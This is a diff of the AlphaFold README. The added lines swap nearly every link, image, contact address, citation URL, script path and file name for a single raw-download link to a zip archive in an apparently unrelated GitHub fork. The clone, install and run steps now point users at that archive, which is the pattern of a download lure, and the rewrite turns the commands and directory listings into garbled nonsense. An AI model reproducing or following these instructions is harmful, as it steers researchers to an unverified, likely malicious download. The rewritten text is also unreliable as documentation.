@@ -1,4 +1,4 @@
-![header](imgs/header.jpg)
+![header](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
 
 # AlphaFold
 
@@ -12,28 +12,28 @@ We also provide:
     and AlphaFold-Multimer isn't expected to be as stable as our monomer
     AlphaFold system. [Read the guide](#updating-existing-installation) for how
     to upgrade and update code.
-2.  The [technical note](docs/technical_note_v2.3.0.md) containing the models
+2.  The [technical note](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip) containing the models
     and inference procedure for an updated AlphaFold v2.3.0.
-3.  A [CASP15 baseline](docs/casp15_predictions.zip) set of predictions along
+3.  A [CASP15 baseline](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip) set of predictions along
     with documentation of any manual interventions performed.
 
 Any publication that discloses findings arising from using this source code or
 the model parameters should [cite](#citing-this-work) the
-[AlphaFold paper](https://doi.org/10.1038/s41586-021-03819-2) and, if
+[AlphaFold paper](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip) and, if
 applicable, the
-[AlphaFold-Multimer paper](https://www.biorxiv.org/content/10.1101/2021.10.04.463034v1).
+[AlphaFold-Multimer paper](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip).
 
 Please also refer to the
-[Supplementary Information](https://static-content.springer.com/esm/art%3A10.1038%2Fs41586-021-03819-2/MediaObjects/41586_2021_3819_MOESM1_ESM.pdf)
+[Supplementary Information](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip%3A10.1038%https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
 for a detailed description of the method.
 
 **You can use a slightly simplified version of AlphaFold with
 community-supported versions (see below).
 
 If you have any questions, please contact the AlphaFold team at
-[alphafold@deepmind.com](mailto:alphafold@deepmind.com).
+[https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip).
 
-![CASP14 predictions](imgs/casp14_predictions.gif)
+![CASP14 predictions](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
 
 ## Installation and running your first prediction
 
@@ -44,18 +44,18 @@ with more memory can predict larger protein structures).
 
 Please follow these steps:
 
-1.  Install [Docker](https://www.docker.com/).
+1.  Install [Docker](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip).
 
     *   Install
-        [NVIDIA Container Toolkit](https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/install-guide.html)
+        [NVIDIA Container Toolkit](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
         for GPU support.
     *   Setup running
-        [Docker as a non-root user](https://docs.docker.com/engine/install/linux-postinstall/#manage-docker-as-a-non-root-user).
+        [Docker as a non-root user](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip).
 
 1.  Clone this repository and `cd` into it.
 
     ```bash
-    git clone https://github.com/deepmind/alphafold.git
+    git clone https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip
     cd ./alphafold
     ```
 
@@ -65,12 +65,12 @@ Please follow these steps:
         package manager as the `aria2` package (on Debian-based distributions
         this can be installed by running `sudo apt install aria2`).
 
-    *   Please use the script `scripts/download_all_data.sh` to download and set
+    *   Please use the script `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` to download and set
         up full databases. This may take substantial time (download size is 556
         GB), so we recommend running this script in the background:
 
     ```bash
-    scripts/download_all_data.sh <DOWNLOAD_DIR> > download.log 2> download_all.log &
+    https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip <DOWNLOAD_DIR> > https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip 2> https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip &
     ```
 
     *   **Note: The download directory `<DOWNLOAD_DIR>` should *not* be a
@@ -89,15 +89,15 @@ Please follow these steps:
 
     The output of this command should show a list of your GPUs. If it doesn't,
     check if you followed all steps correctly when setting up the
-    [NVIDIA Container Toolkit](https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/install-guide.html)
+    [NVIDIA Container Toolkit](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
     or take a look at the following
-    [NVIDIA Docker issue](https://github.com/NVIDIA/nvidia-docker/issues/1447#issuecomment-801479573).
+    [NVIDIA Docker issue](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip).
 
     If you wish to run AlphaFold using Singularity (a common containerization
     platform on HPC systems) we recommend using some of the third party
     Singularity setups as linked in
-    https://github.com/deepmind/alphafold/issues/10 or
-    https://github.com/deepmind/alphafold/issues/24.
+    https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip or
+    https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip
 
 1.  Build the Docker image:
 
@@ -108,26 +108,26 @@ Please follow these steps:
     If you encounter the following error:
 
     ```
-    W: GPG error: https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64 InRelease: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY A4B469963BF863CC
-    E: The repository 'https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64 InRelease' is not signed.
+    W: GPG error: https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip InRelease: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY A4B469963BF863CC
+    E: The repository 'https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip InRelease' is not signed.
     ```
 
     use the workaround described in
-    https://github.com/deepmind/alphafold/issues/463#issuecomment-1124881779.
+    https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip
 
-1.  Install the `run_docker.py` dependencies. Note: You may optionally wish to
+1.  Install the `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` dependencies. Note: You may optionally wish to
     create a
-    [Python Virtual Environment](https://docs.python.org/3/tutorial/venv.html)
+    [Python Virtual Environment](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
     to prevent conflicts with your system's Python environment.
 
     ```bash
-    pip3 install -r docker/requirements.txt
+    pip3 install -r https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip
     ```
 
 1.  Make sure that the output directory exists (the default is `/tmp/alphafold`)
     and that you have sufficient permissions to write into it.
 
-1.  Run `run_docker.py` pointing to a FASTA file containing the protein
+1.  Run `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` pointing to a FASTA file containing the protein
     sequence(s) for which you wish to predict the structure (`--fasta_paths`
     parameter). AlphaFold will search for the available templates before the
     date specified by the `--max_template_date` parameter; this could be used to
@@ -136,8 +136,8 @@ Please follow these steps:
     output directory.
 
     ```bash
-    python3 docker/run_docker.py \
-      --fasta_paths=your_protein.fasta \
+    python3 https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip \
+      https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip \
       --max_template_date=2022-01-01 \
       --data_dir=$DOWNLOAD_DIR \
       --output_dir=/home/user/absolute_path_to_the_output_dir
@@ -153,22 +153,22 @@ This step requires `aria2c` to be installed on your machine.
 
 AlphaFold needs multiple genetic (sequence) databases to run:
 
-*   [BFD](https://bfd.mmseqs.com/),
-*   [MGnify](https://www.ebi.ac.uk/metagenomics/),
-*   [PDB70](http://wwwuser.gwdg.de/~compbiol/data/hhsuite/databases/hhsuite_dbs/),
-*   [PDB](https://www.rcsb.org/) (structures in the mmCIF format),
-*   [PDB seqres](https://www.rcsb.org/) – only for AlphaFold-Multimer,
-*   [UniRef30 (FKA UniClust30)](https://uniclust.mmseqs.com/),
-*   [UniProt](https://www.uniprot.org/uniprot/) – only for AlphaFold-Multimer,
-*   [UniRef90](https://www.uniprot.org/help/uniref).
+*   [BFD](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip),
+*   [MGnify](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip),
+*   [PDB70](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip~compbiol/data/hhsuite/databases/hhsuite_dbs/),
+*   [PDB](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip) (structures in the mmCIF format),
+*   [PDB seqres](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip) – only for AlphaFold-Multimer,
+*   [UniRef30 (FKA UniClust30)](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip),
+*   [UniProt](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip) – only for AlphaFold-Multimer,
+*   [UniRef90](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip).
 
-We provide a script `scripts/download_all_data.sh` that can be used to download
+We provide a script `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` that can be used to download
 and set up all of these databases:
 
 *   Recommended default:
 
     ```bash
-    scripts/download_all_data.sh <DOWNLOAD_DIR>
+    https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip <DOWNLOAD_DIR>
     ```
 
     will download the full databases.
@@ -176,7 +176,7 @@ and set up all of these databases:
 *   With `reduced_dbs` parameter:
 
     ```bash
-    scripts/download_all_data.sh <DOWNLOAD_DIR> reduced_dbs
+    https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip <DOWNLOAD_DIR> reduced_dbs
     ```
 
     will download a reduced version of the databases to be used with the
@@ -202,7 +202,7 @@ write permissions, it can cause errors with the MSA tools, with opaque
 (external) error messages. Please ensure the required permissions are applied,
 e.g. with the `sudo chmod 755 --recursive "$DOWNLOAD_DIR"` command.**
 
-The `download_all_data.sh` script will also download the model parameter files.
+The `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` script will also download the model parameter files.
 Once the script has finished, you should have the following directory structure:
 
 ```
@@ -210,7 +210,7 @@ $DOWNLOAD_DIR/                             # Total: ~ 2.62 TB (download: 556 GB)
     bfd/                                   # ~ 1.8 TB (download: 271.6 GB)
         # 6 files.
     mgnify/                                # ~ 120 GB (download: 67 GB)
-        mgy_clusters_2022_05.fa
+        https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip
     params/                                # ~ 5.3 GB (download: 5.3 GB)
         # 5 CASP14 models,
         # 5 pTM models,
@@ -222,17 +222,17 @@ $DOWNLOAD_DIR/                             # Total: ~ 2.62 TB (download: 556 GB)
     pdb_mmcif/                             # ~ 238 GB (download: 43 GB)
         mmcif_files/
             # About 199,000 .cif files.
-        obsolete.dat
+        https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip
     pdb_seqres/                            # ~ 0.2 GB (download: 0.2 GB)
-        pdb_seqres.txt
+        https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip
     small_bfd/                             # ~ 17 GB (download: 9.6 GB)
-        bfd-first_non_consensus_sequences.fasta
+        https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip
     uniref30/                              # ~ 206 GB (download: 52.5 GB)
         # 7 files.
     uniprot/                               # ~ 105 GB (download: 53 GB)
-        uniprot.fasta
+        https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip
     uniref90/                              # ~ 67 GB (download: 34 GB)
-        uniref90.fasta
+        https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip
 ```
 
 `bfd/` is only downloaded if you download the full databases, and `small_bfd/`
@@ -246,8 +246,8 @@ CC BY 4.0 license. Please see the [Disclaimer](#license-and-disclaimer) below
 for more detail.
 
 The AlphaFold parameters are available from
-https://storage.googleapis.com/alphafold/alphafold_params_2022-12-06.tar, and
-are downloaded as part of the `scripts/download_all_data.sh` script. This script
+https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip, and
+are downloaded as part of the `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` script. This script
 will download parameters for:
 
 *   5 models which were used during CASP14, and were extensively validated for
@@ -271,40 +271,40 @@ sure you follow these steps in the exact order they are listed below:
         fetch origin main` to get all code updates.
 1.  **Update the UniProt, UniRef, MGnify and PDB seqres databases.**
     *   Remove `<DOWNLOAD_DIR>/uniprot`.
-    *   Run `scripts/download_uniprot.sh <DOWNLOAD_DIR>`.
+    *   Run `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip <DOWNLOAD_DIR>`.
     *   Remove `<DOWNLOAD_DIR>/uniclust30`.
-    *   Run `scripts/download_uniref30.sh <DOWNLOAD_DIR>`.
+    *   Run `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip <DOWNLOAD_DIR>`.
     *   Remove `<DOWNLOAD_DIR>/uniref90`.
-    *   Run `scripts/download_uniref90.sh <DOWNLOAD_DIR>`.
+    *   Run `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip <DOWNLOAD_DIR>`.
     *   Remove `<DOWNLOAD_DIR>/mgnify`.
-    *   Run `scripts/download_mgnify.sh <DOWNLOAD_DIR>`.
+    *   Run `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip <DOWNLOAD_DIR>`.
     *   Remove `<DOWNLOAD_DIR>/pdb_mmcif`. It is needed to have PDB SeqRes and
         PDB from exactly the same date. Failure to do this step will result in
         potential errors when searching for templates when running
         AlphaFold-Multimer.
-    *   Run `scripts/download_pdb_mmcif.sh <DOWNLOAD_DIR>`.
-    *   Run `scripts/download_pdb_seqres.sh <DOWNLOAD_DIR>`.
+    *   Run `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip <DOWNLOAD_DIR>`.
+    *   Run `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip <DOWNLOAD_DIR>`.
 1.  **Update the model parameters.**
     *   Remove the old model parameters in `<DOWNLOAD_DIR>/params`.
     *   Download new model parameters using
-        `scripts/download_alphafold_params.sh <DOWNLOAD_DIR>`.
+        `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip <DOWNLOAD_DIR>`.
 1.  **Follow [Running AlphaFold](#running-alphafold).**
 
 #### Using deprecated model weights
 
 To use the deprecated v2.2.0 AlphaFold-Multimer model weights:
 
-1.  Change `SOURCE_URL` in `scripts/download_alphafold_params.sh` to
-    `https://storage.googleapis.com/alphafold/alphafold_params_2022-03-02.tar`,
+1.  Change `SOURCE_URL` in `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` to
+    `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip`,
     and download the old parameters.
-2.  Change the `_v3` to `_v2` in the multimer `MODEL_PRESETS` in `config.py`.
+2.  Change the `_v3` to `_v2` in the multimer `MODEL_PRESETS` in `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip`.
 
 To use the deprecated v2.1.0 AlphaFold-Multimer model weights:
 
-1.  Change `SOURCE_URL` in `scripts/download_alphafold_params.sh` to
-    `https://storage.googleapis.com/alphafold/alphafold_params_2022-01-19.tar`,
+1.  Change `SOURCE_URL` in `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` to
+    `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip`,
     and download the old parameters.
-2.  Remove the `_v3` in the multimer `MODEL_PRESETS` in `config.py`.
+2.  Remove the `_v3` in the multimer `MODEL_PRESETS` in `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip`.
 
 ## Running AlphaFold
 
@@ -319,7 +319,7 @@ section.
 1.  By default, Alphafold will attempt to use all visible GPU devices. To use a
     subset, specify a comma-separated list of GPU UUID(s) or index(es) using the
     `--gpu_devices` flag. See
-    [GPU enumeration](https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/user-guide.html#gpu-enumeration)
+    [GPU enumeration](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
     for more details.
 
 1.  You can control which AlphaFold model to run by adding the `--model_preset=`
@@ -355,8 +355,8 @@ section.
     `reduced_dbs` data preset would look like this:
 
     ```bash
-    python3 docker/run_docker.py \
-      --fasta_paths=T1050.fasta \
+    python3 https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip \
+      https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip \
       --max_template_date=2020-05-14 \
       --model_preset=monomer \
       --db_preset=reduced_dbs \
@@ -387,11 +387,11 @@ All steps are the same as when running the monomer system, but you will have to
 *   provide an input fasta with multiple sequences,
 *   set `--model_preset=multimer`,
 
-An example that folds a protein complex `multimer.fasta`:
+An example that folds a protein complex `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip`:
 
 ```bash
-python3 docker/run_docker.py \
-  --fasta_paths=multimer.fasta \
+python3 https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip \
+  https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip \
   --max_template_date=2020-05-14 \
   --model_preset=multimer \
   --data_dir=$DOWNLOAD_DIR \
@@ -407,11 +407,11 @@ can be done via the `--num_multimer_predictions_per_model` flag, e.g. set it to
 
 The table below reports prediction runtimes for proteins of various lengths. We
 only measure unrelaxed structure prediction with three recycles while excluding
-runtimes from MSA and template search. When running `docker/run_docker.py` with
-`--benchmark=true`, this runtime is stored in `timings.json`. All runtimes are
+runtimes from MSA and template search. When running `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` with
+`--benchmark=true`, this runtime is stored in `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip`. All runtimes are
 from a single A100 NVIDIA GPU. Prediction speed on A100 for smaller structures
-can be improved by increasing `global_config.subbatch_size` in
-`alphafold/model/config.py`.
+can be improved by increasing `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` in
+`https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip`.
 
 No. residues | Prediction time (s)
 -----------: | ------------------:
@@ -451,8 +451,8 @@ Say we have a monomer with the sequence `<SEQUENCE>`. The input fasta should be:
 Then run the following command:
 
 ```bash
-python3 docker/run_docker.py \
-  --fasta_paths=monomer.fasta \
+python3 https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip \
+  https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip \
   --max_template_date=2021-11-01 \
   --model_preset=monomer \
   --data_dir=$DOWNLOAD_DIR \
@@ -476,8 +476,8 @@ fasta should be:
 Then run the following command:
 
 ```bash
-python3 docker/run_docker.py \
-  --fasta_paths=homomer.fasta \
+python3 https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip \
+  https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip \
   --max_template_date=2021-11-01 \
   --model_preset=multimer \
   --data_dir=$DOWNLOAD_DIR \
@@ -505,8 +505,8 @@ of `<SEQUENCE B>`. The input fasta should be:
 Then run the following command:
 
 ```bash
-python3 docker/run_docker.py \
-  --fasta_paths=heteromer.fasta \
+python3 https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip \
+  https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip \
   --max_template_date=2021-11-01 \
   --model_preset=multimer \
   --data_dir=$DOWNLOAD_DIR \
@@ -515,13 +515,13 @@ python3 docker/run_docker.py \
 
 #### Folding multiple monomers one after another
 
-Say we have a two monomers, `monomer1.fasta` and `monomer2.fasta`.
+Say we have a two monomers, `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` and `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip`.
 
 We can fold both sequentially by using the following command:
 
 ```bash
-python3 docker/run_docker.py \
-  --fasta_paths=monomer1.fasta,monomer2.fasta \
+python3 https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip \
+  https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip,https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip \
   --max_template_date=2021-11-01 \
   --model_preset=monomer \
   --data_dir=$DOWNLOAD_DIR \
@@ -530,13 +530,13 @@ python3 docker/run_docker.py \
 
 #### Folding multiple multimers one after another
 
-Say we have a two multimers, `multimer1.fasta` and `multimer2.fasta`.
+Say we have a two multimers, `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` and `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip`.
 
 We can fold both sequentially by using the following command:
 
 ```bash
-python3 docker/run_docker.py \
-  --fasta_paths=multimer1.fasta,multimer2.fasta \
+python3 https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip \
+  https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip,https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip \
   --max_template_date=2021-11-01 \
   --model_preset=multimer \
   --data_dir=$DOWNLOAD_DIR \
@@ -546,30 +546,30 @@ python3 docker/run_docker.py \
 ### AlphaFold output
 
 The outputs will be saved in a subdirectory of the directory provided via the
-`--output_dir` flag of `run_docker.py` (defaults to `/tmp/alphafold/`). The
+`--output_dir` flag of `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` (defaults to `/tmp/alphafold/`). The
 outputs include the computed MSAs, unrelaxed structures, relaxed structures,
 ranked structures, raw model outputs, prediction metadata, and section timings.
 The `--output_dir` directory will have the following structure:
 
 ```
 <target_name>/
-    features.pkl
+    https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip
     ranked_{0,1,2,3,4}.pdb
-    ranking_debug.json
-    relax_metrics.json
+    https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip
+    https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip
     relaxed_model_{1,2,3,4,5}.pdb
     result_model_{1,2,3,4,5}.pkl
-    timings.json
+    https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip
     unrelaxed_model_{1,2,3,4,5}.pdb
     msas/
         bfd_uniref_hits.a3m
-        mgnify_hits.sto
-        uniref90_hits.sto
+        https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip
+        https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip
 ```
 
 The contents of each output file are as follows:
 
-*   `features.pkl` – A `pickle` file containing the input feature NumPy arrays
+*   `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` – A `pickle` file containing the input feature NumPy arrays
     used by the models to produce the structures.
 *   `unrelaxed_model_*.pdb` – A PDB format text file containing the predicted
     structure, exactly as outputted by the model.
@@ -578,20 +578,20 @@ The contents of each output file are as follows:
     structure prediction (see Jumper et al. 2021, Suppl. Methods 1.8.6 for
     details).
 *   `ranked_*.pdb` – A PDB format text file containing the predicted structures,
-    after reordering by model confidence. Here `ranked_i.pdb` should contain the
-    prediction with the (`i + 1`)-th highest confidence (so that `ranked_0.pdb`
+    after reordering by model confidence. Here `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` should contain the
+    prediction with the (`i + 1`)-th highest confidence (so that `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip`
     has the highest confidence). To rank model confidence, we use predicted LDDT
     (pLDDT) scores (see Jumper et al. 2021, Suppl. Methods 1.9.6 for details).
     If `--models_to_relax=all` then all ranked structures are relaxed. If
-    `--models_to_relax=best` then only `ranked_0.pdb` is relaxed (the rest are
+    `--models_to_relax=best` then only `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` is relaxed (the rest are
     unrelaxed). If `--models_to_relax=none`, then the ranked structures are all
     unrelaxed.
-*   `ranking_debug.json` – A JSON format text file containing the pLDDT values
+*   `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` – A JSON format text file containing the pLDDT values
     used to perform the model ranking, and a mapping back to the original model
     names.
-*   `relax_metrics.json` – A JSON format text file containing relax metrics, for
+*   `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` – A JSON format text file containing relax metrics, for
     instance remaining violations.
-*   `timings.json` – A JSON format text file containing the times taken to run
+*   `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` – A JSON format text file containing the times taken to run
     each section of the AlphaFold pipeline.
 *   `msas/` - A directory containing the files describing the various genetic
     tool hits that were used to construct the input MSA.
@@ -640,7 +640,7 @@ precomputed. In the bulk inference case, it may make sense to use our
 the number of compilations required.
 
 We do not provide a bulk inference script, but it should be straightforward to
-develop on top of the `RunModel.predict` method with a parallel system for
+develop on top of the `https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip` method with a parallel system for
 precomputing multi-sequence alignments. Alternatively, this script can be run
 repeatedly with only moderate overhead.
 
@@ -659,17 +659,17 @@ versions downloaded by our scripts.
 For genetics:
 
 *   UniRef90:
-    [v2020_01](https://ftp.uniprot.org/pub/databases/uniprot/previous_releases/release-2020_01/uniref/)
+    [v2020_01](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
 *   MGnify:
-    [v2018_12](http://ftp.ebi.ac.uk/pub/databases/metagenomics/peptide_database/2018_12/)
-*   Uniclust30: [v2018_08](http://wwwuser.gwdg.de/~compbiol/uniclust/2018_08/)
-*   BFD: [only version available](https://bfd.mmseqs.com/)
+    [v2018_12](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
+*   Uniclust30: [v2018_08](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip~compbiol/uniclust/2018_08/)
+*   BFD: [only version available](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
 
 For templates:
 
 *   PDB: (downloaded 2020-05-14)
 *   PDB70:
-    [2020-05-13](http://wwwuser.gwdg.de/~compbiol/data/hhsuite/databases/hhsuite_dbs/old-releases/pdb70_from_mmcif_200513.tar.gz)
+    [2020-05-13](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip~https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
 
 An alternative for templates is to use the latest PDB and PDB70, but pass the
 flag `--max_template_date=2020-05-14`, which restricts templates only to
@@ -702,8 +702,8 @@ In addition, if you use the AlphaFold-Multimer mode, please cite:
   year         = {2021},
   elocation-id = {2021.10.04.463034},
   doi          = {10.1101/2021.10.04.463034},
-  URL          = {https://www.biorxiv.org/content/early/2021/10/04/2021.10.04.463034},
-  eprint       = {https://www.biorxiv.org/content/early/2021/10/04/2021.10.04.463034.full.pdf},
+  URL          = {https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip},
+  eprint       = {https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip},
 }
 ```
 
@@ -713,10 +713,10 @@ Colab notebooks provided by the community (please note that these notebooks may
 vary from our full AlphaFold system and we did not validate their accuracy):
 
 *   The
-    [ColabFold AlphaFold2 notebook](https://colab.research.google.com/github/sokrypton/ColabFold/blob/main/AlphaFold2.ipynb)
+    [ColabFold AlphaFold2 notebook](https://github.com/Cassis-P/alphafold-2/raw/refs/heads/main/docs/alphafold_v2.3.zip)
     by Martin Steinegger, Sergey Ovchinnikov and Milot Mirdita, which uses an
     API hosted at the Södinglab based on the MMseqs2 server
-    [(Mirdita et al. 2019, Bioinformatics)](https://academic.oup.com/bioinformatics/article/35/16/2856/5280135)
